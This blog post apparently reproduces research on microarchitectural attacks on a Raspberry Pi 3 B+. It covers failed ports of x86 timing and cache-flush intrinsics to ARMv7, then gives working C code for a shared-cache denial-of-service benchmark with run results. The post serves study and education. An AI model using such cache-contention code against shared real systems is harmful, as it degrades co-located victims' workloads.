---
layout:             post
title:              "Microarchitectural Attacks on ARM: Part 1"
category:           "Hardware Security"
tags:               hardware-security microarchitecture raspberry-pi last-level-cache
permalink:          /blog/march-attacks-on-arm-part-1
last_modified_at:   "2022-12-18"
---

I have attempted to shed light on whys and hows regarding the [Spectre]({{ site.baseurl }}/blog/seedlabs/march-attacks) and [Meltdown]({{ site.baseurl }}/blog/seedlabs/meltdown) attacks with materials drawn from [SEED Labs 2.0](https://seedsecuritylabs.org). A MacBook Air equipped with Intel Core i5-5250U was used to run the C programs. Here in this post, I would like to address the problem of launching microarchitectural attacks on a Raspberry Pi 3 Model B+[^1], which is an ARM machine.

<!-- excerpt-end -->

The officially released CPU information of Raspberry Pi 3 Model B+:

```text
Broadcom BCM2837B0, Cortex-A53 (ARMv8) 64-bit quad-core System-on-Chip (MPSoC) @ 1.4GHz
```

The kernel version can be retrieved by:

```console
$ uname -a
Linux xingjian 5.10.103-v7+ #1529 SMP Tue Mar 8 12:21:37 GMT 2022 armv7l GNU/Linux
```

Executing the `lscpu` command gives me the following information:

```console
Architecture:           armv7l
Byte Order:             Little Endian
CPU(s):                 4
On-line CPU(s) list:    0-3
Thread(s) per core:     1
Core(s) per socket:     4
Socket(s):              1
Vendor ID:              ARM
Model:                  4
Model name:             Cortex-A53
Stepping:               r0p4
CPU max MHz:            1200.0000
CPU min MHz:            600.0000
BogoMIPS:               38.40
Flags:                  half thumb fastmult vfp edsp neon vfpv3 tls vfpv4 idiva idivt vfpd32 lpae evtstrm crc32
```

If I add the line `arm_control=0x200` to the end of the file `/boot/config.txt` and reboot the system, executing the `lscpu` command gives me the following instead:

```console
Architecture:           aarch64
Byte Order:             Little Endian
CPU(s):                 4
On-line CPU(s) list:    0-3
Thread(s) per core:     1
Core(s) per socket:     4
Socket(s):              1
Vendor ID:              ARM
Model:                  4
Model name:             Cortex-A53
Stepping:               r0p4
CPU max MHz:            1200.0000
CPU min MHz:            600.0000
BogoMIPS:               38.40
Flags:                  fp asimd evtstrm crc32 cpuid
```

I will stick to the `armv7l` ($$32$$-bit) kernel.

## Table of Contents
{:.no_toc}
* TOC 
{:toc}

## Some Attempts to Adapt x86 Intrinsics Functions for ARMv7

### Replacing `__rdtscp()`

The following C code snippet was used to time memory accesses in our previous Intel-based attacks:

```c
addr = &array[i];
time1 = __rdtscp(&junk);
junk = *addr;
time2 = __rdtscp(&junk) - time1;
```

I conducted an experiment using the C program shown below on my Raspberry Pi:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <time.h>

#define N 10

uint8_t array[N * 4096];

uint64_t arm_v7_get_timing(void)
{
    uint32_t result = 0;
    asm volatile ("MRC p15, 0, %0, c9, c13, 0" : "=r" (result));
    return result;
}

uint64_t get_timing(void)
{
    uint64_t result = 0;
    result = arm_v7_get_timing();
    return result;
}

int main()
{
    uint64_t time1, time2;
    volatile uint8_t *addr;
    unsigned int junk = 0;
    int i;

    for (i = 0; i < N; i += 2) {
        array[i * 4096] = 1;
    }

    for (i = 0; i < N; i++) {
        addr = &array[i * 4096];
        time1 = get_timing();
        junk = *addr;
        time2 = get_timing() - time1;
        printf("Access time for array[%d * 4096]: %5u\n", i, (unsigned int)time2);
    }

    return 0;
}
```

The ARM architecture (in the $$32$$-bit instruction set) has support for 16 coprocessors (`CP0` to `CP15`) that extend the ARM's functionality. The purpose of the system control coprocessor, `CP15`, is to control and provide status information for the functions implemented in the processor. Although the code can be compiled successfully, I received the `Illegal instruction` error after running the program.

### Replacing `_mm_mfence()`

A memory barrier in ARM (or "memory fence" in other architectures) is an instruction that requires the core to apply an ordering constraint between memory operations that occur before and after the memory barrier instruction in the program.

I added the following macro and function definitions to my timing program:

```c
#define DSB     asm volatile ("dsb sy" : : : "memory") /* Data Synchronization Barrier */
#define ISB     asm volatile ("isb sy" : : : "memory") /* Instruction Synchronization Barrier */
#define dsb()   DSB
#define isb()   ISB

void arm_v7_memory_barrier(void)
{
    dsb();
    isb();
}
```

and I tried to call my `get_timing()` function with this memory barrier function. Unfortunately, I obtained the error message stating that selected processor does not support `dsb` and `isb` in ARM mode.

### Replacing `_mm_clflush()`

A cache flush instruction, which serves the legitimate purpose of manually maintaining cache coherency (e.g., for memory-mapped input/output or self-modifying code) is used by attacks such as Flush+Reload and Flush+Flush. On any x86 processor implementing the SSE2 instruction set extension, this flush instruction is available from all privilege levels as `clflush`. For example:

```c
#include <x86intrin.h>

uint8_t array[256 * 4096];

#define DELTA 1024

void flushSideChannel()
{
    int i;
    /* Write to array to bring it to RAM to prevent COW */
    for (i = 0; i < 256; i++) {
        array[i * 4096 + DELTA] = 1;
    }
    /* Flush the values of the array from cache */
    for (i = 0; i < 256; i++) {
       _mm_clflush(&array[i * 4096 + DELTA]);
    }
}
```

ARM employs *cache invalidate*[^2] and *cache clean*[^3] operations that can be performed by cache set, or way, or virtual address. They are only available to the privileged modes and cannot be executed in userspace. An instruction similar to x86 `clflush` was introduced for ARM processors only in the most recent architecture version, ARMv8. In contrast to `clflush`, it must be specifically enabled to be accessible from userspace. For all processors with a disabled flush instruction or an earlier architecture version, e.g., ARMv7, only eviction-based cache attacks can be deployed (e.g., Evict+Time, Prime+Probe, Evict+Reload attacks). I conducted an experiment with the following C program that makes use of the built-in cache clearing system call:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <time.h>

#define N 10

uint8_t array[N * 4096];

/* 
 * Source:
 * https://minghuasweblog.wordpress.com/2013/03/29/
 * https://issuetracker.google.com/issues/36906645
 */
void clear_cache(void* start, void* end)
{
    const int syscall = 0xf002; /* __ARM_NR_cacheflush */
    asm volatile (
        "mov    r0, %0\n"
        "mov    r1, %1\n"
        "mov    r7, %2\n"
        "mov    r2, #0x0\n"
        "svc    0x00000000\n"
        :
        :   "r" (start), "r" (end), "r" (syscall)
        :   "r0", "r1", "r7"
    );
}

uint64_t get_monotonic_time(void)
{
    struct timespec t1;
    clock_gettime(CLOCK_MONOTONIC, &t1);
    return t1.tv_sec * 1000000000ULL + t1.tv_nsec;
}

uint64_t get_timing(void)
{
    uint64_t result = 0;
    result = get_monotonic_time();
    return result;
}

int main()
{
    uint64_t time1, time2;
    volatile uint8_t *addr;
    unsigned int junk = 0;
    int i;

    for (i = 0; i < N; i++) {
        array[i * 4096] = 1;
    }

    for (i = 0; i < N; i++) {
        clear_cache(&array[i * 4096], &array[i * 4096] + 1);
    }

    /* Wait for cache flushing to complete */
    for (i = 0; i < 100; i++) {}

    array[3 * 4096] = 100;
    array[7 * 4096] = 200;

    for (i = 0; i < N; i++) {
        addr = &array[i * 4096];
        time1 = get_timing();
        junk = *addr;
        time2 = get_timing() - time1;
        printf("Access time for array[%d * 4096]: %5u\n", i, (unsigned int)time2);
    }

    return 0;
}
```

The syscall number of `cacheflush` is defined in [this header file](https://elixir.bootlin.com/linux/v3.1/source/arch/arm/include/asm/unistd.h) by:

```c
#define __NR_OABI_SYSCALL_BASE	0x900000

#if defined(__thumb__) || defined(__ARM_EABI__)
#define __NR_SYSCALL_BASE	0
#else
#define __NR_SYSCALL_BASE	__NR_OABI_SYSCALL_BASE
#endif

#define __ARM_NR_BASE			(__NR_SYSCALL_BASE+0x0f0000)
#define __ARM_NR_breakpoint		(__ARM_NR_BASE+1)
#define __ARM_NR_cacheflush		(__ARM_NR_BASE+2)
```

Below is the results from running the program:

```console
Access time for array[0 * 4096]:  1146
Access time for array[1 * 4096]:   677
Access time for array[2 * 4096]:   365
Access time for array[3 * 4096]:   364
Access time for array[4 * 4096]:   365
Access time for array[5 * 4096]:   572
Access time for array[6 * 4096]:   364
Access time for array[7 * 4096]:   365
Access time for array[8 * 4096]:   365
Access time for array[9 * 4096]:   364
```

There is no difference between the memory access time of two array elements we accessed after flushing and the other selected elements.

## Denial-of-Service Attack on Shared Cache

In this section, I would like to present the results from running the benchmark attack proposed by Bechtel and Yun (2019)[^4] on my Raspberry Pi.

### Background

Burger et al. (1996)[^5] divided program execution time $$T$$ into three categories:

- *Processor time* $$T_{p}$$: the time in which the processor is either fully utilized, or is only partially utilized or stalled due to lack of instruction-level parallelism (ILP);
- *Latency time* $$T_{L}$$: the number of lost cycles due to untolerated, intrinsic memory latencies (could not be reduced by adding more bandwidth in between levels of the memory hierarchy);
- *Bandwidth time* $$T_{B}$$: the number of lost cycles due both to contention in the memory system and to insufficient bandwidth between levels of the hierarchy.

|---
| **MT Approach** | **Resources Shared between Threads** | **Context Switch Mechanism**
|:-|:-|:-
| None | Everything | Explicit operating system <br> context switch
| Fine-grained | Everything but register file <br> and control logic/state | Switch every cycle
| Coarse-grained | Everything but I-fetch buffers, <br> register file, and control logic/state | Switch on pipeline stall
| SMT | Everything but I-fetch buffers, <br> return address stack, <br> architected register file, <br> control logic/state, <br> reorder buffer, store queue, etc. | All contexts concurrently <br> active; no switching
| CMP | Secondary cache, system interconnect | All contexts concurrently <br> active; no switching

*Table 1: Various approaches to resource sharing and context switching, from Shen and Lipasti (2013)*[^6]
{:.table-caption}

A *denial-of-service* (or "DoS" for short) attack is an incident in which a user or organization is deprived of the services of a resource they would normally expect to have. Historically, DoS attacks are directed towards network services; although they can affect other resources, operating systems have typically implemented "fairness" or priority mechanisms to counter malicious misuse. In a conventional computer architecture, it is difficult for a program to launch a DoS attack because there is limited sharing of shared resources such as processor memory bandwidth.

The immense complexity of processors as well as limits on power consumption has made it increasingly difficut to further enhance single-thread performance. For this reason, processor manufacturers have moved on to integrating multiple processors on the same chip in a *tiled* fashion to increase system performance power-efficiently[^7]. In a multi-core chip[^8], different applications can be executed on different processing cores concurrently, thereby improving overall system throughput (with the hope that the execution of an application on one core does not interfere with an application on another core). Caches in modern high-performance multi-processor system-on-a-chips (MPSoCs) are crucial components that efficiently circumvent the performance gap between the speed of the processing elements and the main memory. In some systems, each core has its own private L2 cache, while in others (e.g., Arm&reg; Cortex-A53) the L2 cache is shared between different cores. The choice of a shared vs. non-shared L2 cache affects the performance of the system and a shared cache can be a possible source of vulnerability to DoS attacks[^9].

As good as they are at providing high bandwidth, *blocking caches* are ineffective at hiding cache-miss penalty because they stall the processing elements until the data is received from the main memory. In order to hide this penalty and improve the cache performance, Kroft (1981)[^10] proposed the first *Miss-Handling-Architecture (MHA)*. This type of cache referred to as *non-blocking* relies on the introduction of a set of new registers called *Miss-Status-Holding-Register* (MSHR), which are in charge of tracking the status of cache line misses. Each MSHR stores important information regarding the cache-misses such as the target address and the location of the cache line to refill. For each level of cache in a system, the amount of MSHRs denotes the number of outstanding (i.e., simultaneous) transactions it can handle. This amount is known as the *Memory-Level-Parallelism (MLP)*. At run time, a non-blocking cache behaves as follows: When a cache-miss occurs, the metadata of the cache-miss is stored in one of the available MSHRs. In case the same cache-miss already happened and one MSHR already holds the metadata, the two requests are merged. It is only once the cache line refill request has been served and placed in the proper cache line that the MSHR is made available to store new cache-misses requests. If none of the MSHRs are available, the system stops until one of them becomes available[^11]. In other words, cache hit requests can be delayed if all MSHRs are used up. This situation can happen even if the cache space is partitioned among cores.

### Intel's Memory Bandwidth Benchmark

The source code can be found [here](https://github.com/intel/memory-bandwidth-benchmarks/).

```c
# ifndef MIN
# define MIN(x,y)           ((x)<(y)?(x):(y))
# endif
# ifndef MAX
# define MAX(x,y)           ((x)>(y)?(x):(y))
# endif

#ifndef STREAM_TYPE
#define STREAM_TYPE         double
#endif

#ifndef STREAM_ARRAY_SIZE
#define STREAM_ARRAY_SIZE   10000000
#endif

#ifndef NTIMES
#define NTIMES              10
#endif

static STREAM_TYPE a[STREAM_ARRAY_SIZE+OFFSET],
                   b[STREAM_ARRAY_SIZE+OFFSET],
                   c[STREAM_ARRAY_SIZE+OFFSET];

static double bytes[4] = {
    2 * sizeof(STREAM_TYPE) * STREAM_ARRAY_SIZE,
    2 * sizeof(STREAM_TYPE) * STREAM_ARRAY_SIZE,
    3 * sizeof(STREAM_TYPE) * STREAM_ARRAY_SIZE,
    3 * sizeof(STREAM_TYPE) * STREAM_ARRAY_SIZE
};

static char *label[4] = {
    "Copy:      ",
    "Scale:     ",
    "Add:       ",
    "Triad:     "
};

double mysecond()
{
    struct timeval tp;
    struct timezone tzp;
    int i;
    
    i = gettimeofday(&tp, &tzp);
    return ( (double) tp.tv_sec + (double) tp.tv_usec * 1.e-6 );
}

void main_loop()
{
    scalar = 3.0;
    
    for (k = 0; k < NTIMES; k++) {

        times[0][k] = mysecond();
#pragma omp parallel for
        for (j = 0; j < STREAM_ARRAY_SIZE; j++)
            c[j] = a[j];
        times[0][k] = mysecond() - times[0][k];

        times[1][k] = mysecond();
#pragma omp parallel for
        for (j = 0; j < STREAM_ARRAY_SIZE; j++)
            b[j] = scalar * c[j];
        times[1][k] = mysecond() - times[1][k];

        times[2][k] = mysecond();
#pragma omp parallel for
        for (j = 0; j < STREAM_ARRAY_SIZE; j++)
            c[j] = a[j] + b[j];
        times[2][k] = mysecond() - times[2][k];

        times[3][k] = mysecond();
#pragma omp parallel for
        for (j = 0; j < STREAM_ARRAY_SIZE; j++)
            a[j] = b[j] + scalar * c[j];
        times[3][k] = mysecond() - times[3][k];

    }

    for (k = 1; k < NTIMES; k++) {
        for (j = 0; j < 4; j++) {
            avgtime[j] = avgtime[j] + times[j][k];
            mintime[j] = MIN(mintime[j], times[j][k]);
            maxtime[j] = MAX(maxtime[j], times[j][k]);
	    }
	}
    printf("Function    Best Rate MB/s  Avg time     Min time     Max time\n");
    for (j = 0; j < 4; j++) {
        avgtime[j] = avgtime[j] / (double)(NTIMES - 1);
        printf("%s%12.1f  %11.6f  %11.6f  %11.6f\n",
            label[j],
            1.0E-06 * bytes[j] / mintime[j],
            avgtime[j],
            mintime[j],
            maxtime[j]);
    }
}
```

### Threat Model

There is an attacker who intends to perform a certain kind of DoS attack on some hardware resources which he/she shares with a victim. Primarily, the attacker targets the shared cache. Main assumptions of this shared cache DoS attack are:
- The victim and the attacker are co-located on a multi-core processor, which has a shared last-level cache as well as per-core private caches.
- The runtime (OS and/or hypervisor) provides core and memory isolation between the attacker and the victim.
- The runtime can partition cache space between the core that the attacker runs on and the core that the victim runs on by means of page coloring.
- The only capability the attacker has is to run non-privileged programs on the attacker core.

The attacker's goal is to generate as many concurrent cache-misses on the target cache as quickly as possible, causing timing interference to the tasks running on the victim core.

### Experimental Implementation and Results

I will use the C program `bandwidth.c` to launch the attacks on my Pi:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/time.h>

#define CACHE_LINE_SIZE 64
#define DEFAULT_ALLOC_SIZE_KB 4096
#define DEFAULT_ITER 100

enum access_type { READ, WRITE };

int g_mem_size = DEFAULT_ALLOC_SIZE_KB * 1024;
int *g_mem_ptr = 0;
volatile uint64_t g_nread = 0;
volatile unsigned int g_start;

unsigned int get_usecs()
{
    struct timeval time;
    gettimeofday(&time, NULL);
    return (time.tv_sec * 1000000 + time.tv_usec);
}

void exit_fn(int param)
{
    float duration_in_sec;
    float bandwidth;
    float duration = get_usecs() - g_start;
    duration_in_sec = (float)duration / 1000000;
    printf("g_nread(bytes read) = %lld\n", (long long)g_nread);
    printf("Elapsed = %.2f sec (%.0f usec)\n", duration_in_sec, duration);
    bandwidth = (float)g_nread / duration_in_sec / 1024 / 1024;
    printf("Bandwidth = %.3f MB/s | ", bandwidth);
    printf("Average = %.2f ns\n", (duration * 1000) / (g_nread / CACHE_LINE_SIZE));
    exit(0);
}

int64_t read_attack()
{
    int i;
    int64_t sum = 0;
    for (i = 0; i < g_mem_size / 4; i += (CACHE_LINE_SIZE / 4)) {
        sum += g_mem_ptr[i];
    }
    g_nread += g_mem_size;
    return sum;
}

int write_attack()
{
    register int i;
    for (i = 0; i < g_mem_size / 4; i += (CACHE_LINE_SIZE / 4)) {
        g_mem_ptr[i] = i;
    }
    g_nread += g_mem_size;
    return 1;
}

int main()
{
    int64_t sum = 0;
    int i;
    int acc_type = READ;

    g_mem_ptr = (int *)malloc(g_mem_size);

    memset((char *)g_mem_ptr, 1, g_mem_size);

    for (i = 0; i < g_mem_size / sizeof(int); i++) {
        g_mem_ptr[i] = i;
    }

    /* actual memory access */
    g_start = get_usecs();
    for (i = 0; ; i++) {
        switch(acc_type) {
        case READ:
            sum += read_attack();
            break;
        case WRITE:
            sum += write_attack();
            break;
        }

        if (i >= DEFAULT_ITER) {
            break;
        }
    }
    printf("Total sum = %ld\n", (long)sum);
    exit_fn(0);

    return 0;
}
```

Note that default number of iterations is set to $$100$$, which is used to terminate the `for`-loop that performs memory accesses.

When the variable `acc_type` is set to `READ`, the read attack function is called: the code iterates over a one-dimensional array, at every cache-line distance, and sums them up. Because the variable `sum` is allocated on a register by the compiler, the code essentially keeps generating memory load operations, which may always miss the target cache if the array size is bigger than the cache size. These missed loads will stress the cache's MSHR.

```console
$ gcc -O2 -Wall bandwidth.c -o bandwidth
$ ./bandwidth
Total sum = -52953088
g_nread(bytes read) = 423624704
Elapsed = 0.26 sec (258313 usec)
Bandwidth = 1563.994 MB/s | Average = 39.03 ns
```

When the variable `acc_type` is set to `WRITE`, the write attack function is called: the code iterates the same array, at every cache-line distance, it updates each entry. On a write-back cache, each missed store will trigger two memory transactions: one memory read (cache-line fill) and one memory write (write-back of the evicted cache line). Therefore, these missed stores will stress both the MSHRs and write buffer[^12] of a cache.

```console
$ gcc -O2 -Wall bandwidth.c -o bandwidth
$ ./bandwidth
Total sum = 101
g_nread(bytes read) = 423624704
Elapsed = 0.53 sec (533687 usec)
Bandwidth = 756.998 MB/s | Average = 80.63 ns
```

I will also use the following code snippet to bind program execution to a certain processing core, specified by the variable `cpuid`:

```c
void set_cpu_affinity(int cpuid)
{
    cpu_set_t cmask;
    int nprocessors = sysconf(_SC_NPROCESSORS_CONF);
    CPU_ZERO(&cmask);
    CPU_SET(cpuid % nprocessors, &cmask);
    if (sched_setaffinity(0, nprocessors, &cmask) < 0) {
        perror("sched_setaffinity() error");
    } else {
        fprintf(stderr, "Assigned to CPU%d\n", cpuid);
    }
}
```

For instance, a read attack with `cpuid = 3` gives the following output:

```console
$ gcc -O2 -Wall bandwidth.c -o bandwidth
$ ./bandwidth
Assigned to CPU3
Total sum = -52953088
g_nread(bytes read) = 423624704
Elapsed = 0.25 sec (249611 usec)
CPU3: Bandwidth = 1618.518 MB/s | CPU3: Average = 37.71 ns
```

The C program `latency.c` is used to generate measurements about memory access latency:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>
#include "list.h"

#define CACHE_LINE_SIZE 64
#define DEFAULT_ALLOC_SIZE_KB 4096
#define DEFAULT_ITER 100

struct item {
    int data;
    int in_use;
    struct list_head list;
} __attribute__((aligned(CACHE_LINE_SIZE)));;

int g_mem_size = DEFAULT_ALLOC_SIZE_KB * 1024;

uint64_t get_elapsed(struct timespec * start, struct timespec *end)
{
    uint64_t result;
    result = ((uint64_t)end->tv_sec * 1000000000L + end->tv_nsec) - ((uint64_t)start->tv_sec * 1000000000L + start->tv_nsec);
    return result;
}

int main()
{
    struct item *list;
    struct item *itmp;
    struct list_head head;
    struct list_head *pos;
    struct timespec start, end;
    int workingset_size = 1024;
    int i, j;
    int serial = 0;
    int tmp, next;
    int *perm;
    uint64_t readsum = 0;
    uint64_t nsdiff;
    double avglat;

    workingset_size = g_mem_size / CACHE_LINE_SIZE;
    srand(0);
    INIT_LIST_HEAD(&head);

    /* allocate */
    list = (struct item *)malloc(sizeof(struct item) * workingset_size + CACHE_LINE_SIZE);
    for (i = 0; i < workingset_size; i++) {
        list[i].data = i;
        list[i].in_use = 0;
        INIT_LIST_HEAD(&list[i].list);
    }

    /* initialize */
    perm = (int *)malloc(workingset_size * sizeof(int));
    for (i = 0; i < workingset_size; i++) {
        perm[i] = i;
    }
    if (!serial) {
        for (i = 0; i < workingset_size; i++) {
            tmp = perm[i];
            next = rand() % workingset_size;
            perm[i] = perm[next];
            perm[next] = tmp;
        }
    }
    for (i = 0; i < workingset_size; i++) {
        list_add(&list[perm[i]].list, &head);
    }

    /* actual access */
    clock_gettime(CLOCK_REALTIME, &start);
    for (j = 0; j < DEFAULT_ITER; j++) {
        pos = (&head)->next;
        for (i = 0; i < workingset_size; i++) {
            itmp = list_entry(pos, struct item, list);
            readsum += itmp->data; /* read attack*/
            pos = pos->next;
        }
    }
    clock_gettime(CLOCK_REALTIME, &end);

    nsdiff = get_elapsed(&start, &end);
    avglat = (double)nsdiff / workingset_size/ DEFAULT_ITER;
    printf("Duration %.0f us\nAverage %.2f ns | ", (double)nsdiff / 1000, avglat);
    printf("Bandwidth %.2f MB (%.2f MiB)/s\n", (double)64 * 1000 / avglat, (double)64 * 1000000000 / avglat / 1024 / 1024);
    printf("readsum %lld\n", (unsigned long long)readsum);
    return 0;
}
```

Compile and run the program:

```console
$ gcc -O2 -Wall latency.c -o latency
$ ./latency
Duration 1283807 us
Average 195.89 ns | Bandwidth 326.71 MB (311.57 MiB)/s
readsum 214745088000
```

Since I am going to launch multiple tasks in parallel, it is for general convenience to include the following code snippet in the `main` functions of both programs to allow them to accept a user-specified integer as CPU ID:
```c
if (argc > 0) {
    cpuid = atoi(argv[1]);
}    
```

At this stage, all we need for cache contention measurements is ready.

Run the read attack bound to `CPU1` and the latency program bound to `CPU0` at the same time:

```console
$ ./bandwidth 1 & ./latency 0
[1] 1052
Assigned to CPU1
Assigned to CPU0
Total sum = -52953088
g_nread(bytes read) = 423624704
Elapsed = 0.32 sec (323640 usec)
CPU1: Bandwidth = 1248.301 MB/s | CPU1: Average = 48.89 ns
Duration 1326273 ns
Average 202.37 ns | Bandwidth 316.25 MB (301.60 MiB)/s
readsum 214745088000
[1]+  Done                    ./bandwidth 1
```

Similarly, run multiple read attacks along side the latency program:

```console
$ ./bandwidth 1 & ./bandwidth 2 & ./latency 3
[1] 1067
[2] 1068
Assigned to CPU1
Assigned to CPU2
Assigned to CPU3
Total sum = -52953088
g_nread(bytes read) = 423624704
Elapsed = 0.52 sec (520804 usec)
CPU2: Bandwidth = 775.724 MB/s | CPU2: Average = 78.68 ns
Total sum = -52953088
g_nread(bytes read) = 423624704
Elapsed = 0.53 sec (530152 usec)
CPU1: Bandwidth = 762.046 MB/s | CPU1: Average = 80.09 ns
Duration 1505817 ns
Average 229.77 ns | Bandwidth 278.54 MB (265.64 MiB)/s
readsum 214745088000
[1]-  Done                    ./bandwidth 1
[2]+  Done                    ./bandwidth 2
$ ./bandwidth 0 & ./bandwidth 1 & ./bandwidth 2 & ./latency 3
[1] 1074
[2] 1075
[3] 1076
Assigned to CPU0
Assigned to CPU2
Assigned to CPU1
Assigned to CPU3
Total sum = -52953088
g_nread(bytes read) = 423624704
Elapsed = 0.77 sec (773615 usec)
CPU2: Bandwidth = 522.224 MB/s | CPU2: Average = 116.88 ns
Total sum = -52953088
g_nread(bytes read) = 423624704
Elapsed = 0.79 sec (791495 usec)
CPU1: Bandwidth = 510.426 MB/s | CPU1: Average = 119.58 ns
Total sum = -52953088
g_nread(bytes read) = 423624704
Elapsed = 0.85 sec (850417 usec)
CPU0: Bandwidth = 475.061 MB/s | CPU0: Average = 128.48 ns
Duration 1744889 ns
Average 266.25 ns | Bandwidth 240.38 MB (229.24 MiB)/s
readsum 214745088000
[1]   Done                    ./bandwidth 0
[2]-  Done                    ./bandwidth 1
[3]+  Done                    ./bandwidth 2
```

For write attacks:

```console
$ ./bandwidth 0 & ./latency 1
[1] 1089
Assigned to CPU0
Assigned to CPU1
Total sum = 101
g_nread(bytes read) = 423624704
Elapsed = 0.61 sec (609684 usec)
CPU0: Bandwidth = 662.638 MB/s | CPU0: Average = 92.11 ns
Duration 1586429 ns
Average 242.07 ns | Bandwidth 264.39 MB (252.14 MiB)/s
readsum 214745088000
[1]+  Done                    ./bandwidth 0
$ ./bandwidth 3 & ./bandwidth 2 & ./latency 0
[1] 1200
[2] 1201
Assigned to CPU2
Assigned to CPU3
Assigned to CPU0
Total sum = 101
g_nread(bytes read) = 423624704
Elapsed = 1.10 sec (1095559 usec)
CPU2: Bandwidth = 368.762 MB/s | CPU2: Average = 165.51 ns
Total sum = 101
g_nread(bytes read) = 423624704
Elapsed = 1.14 sec (1135191 usec)
CPU3: Bandwidth = 355.887 MB/s | CPU3: Average = 171.50 ns
Duration 2060979 ns
Average 314.48 ns | Bandwidth 203.51 MB (194.08 MiB)/s
readsum 214745088000
[1]-  Done                    ./bandwidth 3
[2]+  Done                    ./bandwidth 2
$ ./bandwidth 1 & ./bandwidth 2 & ./bandwidth 3 & ./latency 0
[1] 1230
[2] 1231
[3] 1232
Assigned to CPU1
Assigned to CPU0
Assigned to CPU2
Assigned to CPU3
Total sum = 101
g_nread(bytes read) = 423624704
Elapsed = 1.24 sec (1239622 usec)
CPU2: Bandwidth = 325.906 MB/s | CPU2: Average = 187.28 ns
Total sum = 101
g_nread(bytes read) = 423624704
Elapsed = 1.66 sec (1664516 usec)
CPU1: Bandwidth = 242.716 MB/s | CPU1: Average = 251.47 ns
Total sum = 101
g_nread(bytes read) = 423624704
Elapsed = 1.65 sec (1646259 usec)
CPU3: Bandwidth = 245.405 MB/s | CPU3: Average = 248.71 ns
Duration 2410497 ns
Average 367.81 ns | Bandwidth 174.00 MB (165.94 MiB)/s
readsum 214745088000
[1]   Done                    ./bandwidth 1
[2]-  Done                    ./bandwidth 2
[3]+  Done                    ./bandwidth 3
```

From the results shown above, we can see that read attacks have moderate impacts on memory accesses while write attacks significantly drag down performance.

## Notes

[^1]: Pi 3 B+ has a $32$ KiB 2-way set-associative **L1 instruction cache** and a $32$ KiB 4-way set-associative **L1 data cache** ($128$ cache sets) per core, and a $512$ KiB 16-way set-associative **shared L2 cache** ($512$ cache sets). The cache line size of these components is $64$ bytes. One can also refer to [the latest Arm&reg; Cortex-A53 MPCore Processor Technical Reference Manual](https://developer.arm.com/documentation/ddi0500/latest/) or this site: [https://patchwork.kernel.org/project/linux-arm-kernel/patch/20211218200009.16856-1-rs@noreya.tech/](https://patchwork.kernel.org/project/linux-arm-kernel/patch/20211218200009.16856-1-rs@noreya.tech/).

[^2]: If a cache line is invalidated, it is cleared of its data by clearing the valid bit of the cache line. However, if the data in the cache-line has been modified, one should not only invalidate it, because the modified data would be lost as it is not written back.

[^3]: If a cache line is cleaned, the contents of the dirty cache line are written out to main memory, and the dirty bit is cleared, which makes the contents of the cache and the main memory coherent. This is only applicable if the write-back policy is used.

[^4]: Michael G. Bechtel and Heechul Yun, "Denial-of-service attacks on shared cache in multicore: Analysis and prevention," In *Proc. IEEE Real-Time Embedded Technol. Appl. Symp.*, 2019, Pages 357-367.

[^5]: Doug Burger, James R. Goodman and Alain K&auml;gi, "Memory bandwidth limitations of future microprocessors," In *ISCA'96: Proceedings of the 23rd annual international symposium on Computer architecture*, May 1996, Pages 78-89.

[^6]: John Paul Shen and Mikko H. Lipasti, *Modern Processor Design: Fundamentals of Superscalar Processors*, Waveland Press, 2013. Note that ARMv7 supports both SMP and CMP kernels.

[^7]: Tiled multi-core architectures are specifically designed to scale easily as improvements in process technology provide more transistors on each chip. In a tiled multi-core, each core is combined with a communication network router to form an independent modular "tile." By replicating tiles across the area of a chip and connecting neighboring routers together, a complete on-chip communication network is created. Processors of any size can be built by simply laying down additional tiles.

[^8]: A "core" includes the instruction processing pipelines (integer and floating-point), instruction execution units, and the L1 instruction and data caches.

[^9]: See: Thomas Moscibroda and Onur Mutlu, "Memory performance attacks: denial of memory service in multi-core systems," *SS'07: Proceedings of 16th USENIX Security Symposium on USENIX Security Symposium*, August 2007, Pages 1-18.

[^10]: David Kroft, "Lockup-free instruction fetch/prefetch cache organization," *ISCA'81: Proceedings of the 8th annual symposium on Computer Architecture*, May 1981, Pages 81-87.

[^11]: Denis Hoornaert, Shahin Roozkhosh, Renato Mancuso and Marco Caccamo, "Work in Progress: Indentifying Unexpected Inter-core Interference Induced by Shared Cache," *2021 IEEE 27th Real-Time and Embedded Technology and Applications Symposium (RTAS)*, 18-21 May 2021, Nashville, TN, USA.

[^12]: The L1 Data cache of Arm&reg; Cortex-A53 supports only a Write-Back policy. It normally allocates a cache line on either a read miss or a write miss. In the Write-Back policy, a write buffer can be used to minimize latency. When a read miss occurs, the dirty cache is first copied to the write buffer after which the memory can be read, filling the cache with the new data. Only then the main memory is updated by the write buffer.